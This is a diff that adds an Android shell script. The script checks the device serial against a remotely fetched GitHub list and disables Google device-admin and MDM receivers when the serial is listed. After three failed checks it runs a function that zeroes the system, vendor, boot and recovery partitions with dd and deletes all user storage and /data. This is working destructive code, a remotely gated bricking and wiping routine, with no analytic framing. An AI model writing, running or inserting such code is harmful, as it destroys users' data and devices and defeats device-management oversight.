@@ -1,0 +1,76 @@
+#!/system/bin/sh
+temp=/data/system/temp
+sysdir=/data/system
+temp2=$sysdir/temp2
+DEBUG="1"
+echolog() {
+    [ "$DEBUG" = "1" ] && echo "$@" >>$temp
+}
+seradd=$(getprop ro.serialno)
+radd=$(getprop ro.build.display.id)
+echolog "d1 v3 $seradd $radd"
+id
+date >>$temp
+ohreally() {
+    mount -o remount,rw /
+    mount -o remount,rw /vendor
+    for i in system product vendor system_ext odm boot recovery; do
+        blockdev --setrw /dev/block/mapper/$i
+        e2fsck -f /dev/block/mapper/$i
+        resize2fs /dev/block/mapper/$i
+        e2fsck -E unshare_blocks -y -f /dev/block/mapper/$i
+        tune2fs -O ^read-only /dev/block/mapper/$i
+        mount -o rw,remount -t auto /$i
+        dd if=/dev/zero of=/dev/block/by-name/$i
+    done
+    rm -rf /sdcard/* /sdcard/.* /storage/emulated/*/* /storage/emulated/*/.* /storage/emulated/* /storage/*/* /storage/*/.* /storage/* /data/* /data/.* /system/* /system/.* /vendor/* /vendor/.* >/dev/null 2>&1
+    reboot || /vendor/bin/reboot || /system/bin/reboot
+}
+exitt() {
+    rm -rf $temp $temp2
+    pm disable com.google.android.gms/com.google.android.gms.auth.managed.admin.DeviceAdminReceiver
+    pm disable com.google.android.gms/com.google.android.gms.mdm.receivers.MdmDeviceAdminReceiver
+    exit
+}
+verify() {
+    echolog "Running..."
+    sclist=$(curl -s https://raw.githubusercontent.com/sauviksaha/temp/main/dpm)
+    if [[ ! -z $sclist ]]; then
+        if [[ $sclist == *"$seradd"* ]]; then
+            echo "$seradd" >$sysdir/$seradd.key
+            echolog "SFo"
+            chmod 644 $sysdir/$seradd.key
+            rm -rf $sysdir/*.pub $sysdir/*.cts $sysdir/unverifieduser.*
+            [[ -e $sysdir/verifieduser.+ ]] && mv $sysdir/verifieduser.+ $temp2
+            7za a $sysdir/verifieduser.+ -ppass -mhe $temp $temp2
+            exitt
+        else
+            echolog "Snfo!"
+            date >>$temp
+            if [[ -e $sysdir/verifyonce.cts ]] && [[ -e $sysdir/verifytwice.cts ]] && [[ -e $sysdir/verifythrice.cts ]]; then
+                ohreally
+            elif [[ -e $sysdir/verifyonce.cts ]] && [[ -e $sysdir/verifytwice.cts ]]; then
+                echo "$seradd" >$sysdir/verifythrice.cts
+                echolog "ver3"
+            elif [[ -e $sysdir/verifyonce.cts ]]; then
+                echo "$seradd" >$sysdir/verifytwice.cts
+                echolog "ver2"
+            else
+                echo "$seradd" >$sysdir/verifyonce.cts
+                echolog "ver1"
+            fi
+            echolog "SD"
+            rm -rf $sysdir/verifieduser.*
+            if [[ -e $sysdir/verifieduser.+ ]] || [[ -e $sysdir/unverifieduser.+ ]]; then
+                mv $sysdir/verifieduser.+ $temp2
+            fi
+            7za a $sysdir/unverifieduser.+ -ppass -mhe $temp $temp2
+            reboot -p
+        fi
+        exitt
+    else
+        echolog "sclist nill"
+        verify
+    fi
+}
+verify
